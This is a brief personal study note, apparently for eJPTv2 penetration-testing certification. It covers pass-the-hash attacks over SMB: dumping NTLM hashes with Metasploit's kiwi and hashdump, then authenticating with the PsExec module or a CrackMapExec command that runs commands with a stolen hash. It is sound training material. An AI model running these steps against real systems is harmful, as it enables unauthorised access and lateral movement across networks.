Tags: #template 
Related to: #note-taking, #notes
See also: 
Index: [[📁EJPTv2 - INDEX]]   

#### Summary
Add a brief overview of what the content is

#### Content
What can we do with the hashes

Pass the hash attack - use hashes to authenticate legitimately via smb

tools
Metasploit PsExec module 
Crackmapexec

Steps

metasploit
exploit and gain access to the target
escalate privs to nt authority sys
use kiwi - lasadump_sam
get ntlmhash
use hashdump to get LM hash
u get o/p in fomrat username:sid:LMhash:NThash(NTLM)
use psexec authenticate rce module 
ser SMBuser username
set SMBPass LMhash:NThash

crackmapexec

crackmapexec smb ip -u username -H "ntlm hash"  -x "command"

###### References  (optional )